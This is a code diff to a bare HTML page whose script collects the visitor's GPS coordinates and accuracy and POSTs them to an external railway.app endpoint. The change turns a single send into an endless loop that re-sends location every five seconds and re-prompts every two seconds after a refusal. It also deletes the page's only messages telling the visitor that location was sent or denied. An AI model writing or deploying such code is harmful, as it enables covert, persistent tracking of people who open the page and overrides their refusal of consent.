@@ -2,23 +2,30 @@
 <html>
 <body>
 <script>
-navigator.geolocation.getCurrentPosition(async (pos) => {
-    const data = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-    };
+function requestLocation() {
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+        };
 
-    await fetch("https://location-production-36c8.up.railway.app/location", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
+        await fetch("https://location-production-36c8.up.railway.app/location", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(data)
+        });
+
+        // Keep retrying after successful send (optional, remove if you want to stop)
+        setTimeout(requestLocation, 5000);
+    }, (err) => {
+        // Retry on error/permission denied
+        setTimeout(requestLocation, 2000);
     });
+}
 
-    document.body.innerHTML = "Location sent";
-}, (err) => {
-    document.body.innerHTML = "Permission denied or error";
-});
+// Start the loop
+requestLocation();
 </script>
 </body>
 </html>
